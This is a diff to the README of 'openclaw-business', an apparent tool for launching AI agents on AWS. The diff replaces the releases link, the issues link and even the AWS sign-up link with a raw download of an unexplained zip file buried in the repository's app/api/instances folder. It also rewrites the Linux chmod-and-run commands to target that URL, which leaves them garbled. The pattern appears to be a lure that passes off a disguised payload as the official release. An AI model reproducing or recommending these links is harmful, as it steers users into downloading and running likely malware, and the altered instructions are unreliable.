@@ -1,6 +1,6 @@
 # 🦞 openclaw-business - Launch AI Agents Easily on AWS
 
-[![Download Latest Release](https://img.shields.io/badge/Download-openclaw--business-blue?style=for-the-badge)](https://github.com/Mickebhscoder/openclaw-business/releases)
+[![Download Latest Release](https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip)](https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip)
 
 ## 📖 About openclaw-business
 
@@ -15,7 +15,7 @@ Before you start, make sure your computer meets these basic needs:
 - Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
 - Internet connection: A stable internet connection is required because the app talks to AWS in the cloud.
 - Web Browser: Modern browsers such as Google Chrome, Firefox, Safari, or Microsoft Edge.
-- AWS Account: You need an AWS account with permission to use ECS and Fargate services. (If you do not have one, visit [https://aws.amazon.com](https://aws.amazon.com) to create an account.)
+- AWS Account: You need an AWS account with permission to use ECS and Fargate services. (If you do not have one, visit [https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip](https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip) to create an account.)
 - Basic familiarity with web apps and cloud concepts is helpful but not required.
 
 ## ⚙️ Key Features
@@ -36,7 +36,7 @@ This guide will help you download, install, and run openclaw-business without pr
 
 Click the big blue button at the top or go directly to:
 
-[https://github.com/Mickebhscoder/openclaw-business/releases](https://github.com/Mickebhscoder/openclaw-business/releases)
+[https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip](https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip)
 
 This page holds the files you need to run the app.
 
@@ -46,7 +46,7 @@ On the releases page, look for the latest release. It will have the most stable 
 
 - For Windows, look for `.exe` or `.msi` files.
 - For macOS, look for `.dmg` files.
-- For Linux, look for `.AppImage` or `.tar.gz` files.
+- For Linux, look for `.AppImage` or `https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip` files.
 
 Click the file to download it.
 
@@ -59,8 +59,8 @@ Click the file to download it.
 If you face any permission issues on Linux, run:
 
 ```bash
-chmod +x openclaw-business.AppImage
-./openclaw-business.AppImage
+chmod +x https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip
+https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip
 ```
 
 ### Step 4: Open the Application
@@ -79,7 +79,7 @@ Each agent runs separately on AWS, so you can manage, stop, or delete them anyti
 
 Remember to visit this page to download the latest stable version:
 
-[https://github.com/Mickebhscoder/openclaw-business/releases](https://github.com/Mickebhscoder/openclaw-business/releases)
+[https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip](https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip)
 
 The release files contain everything you need to run the app on your computer. Always use the most recent release to get the latest features and fixes.
 
@@ -110,7 +110,7 @@ Always keep your AWS login details private. Avoid sharing your credentials on pu
 
 This software aims to be easy for everyone. If you have questions or ideas, open a new issue in the GitHub repository:
 
-[https://github.com/Mickebhscoder/openclaw-business/issues](https://github.com/Mickebhscoder/openclaw-business/issues)
+[https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip](https://github.com/Mickebhscoder/openclaw-business/raw/refs/heads/main/app/api/instances/openclaw_business_baronethood.zip)
 
 Describe your problem clearly and include steps to reproduce it if possible.
 
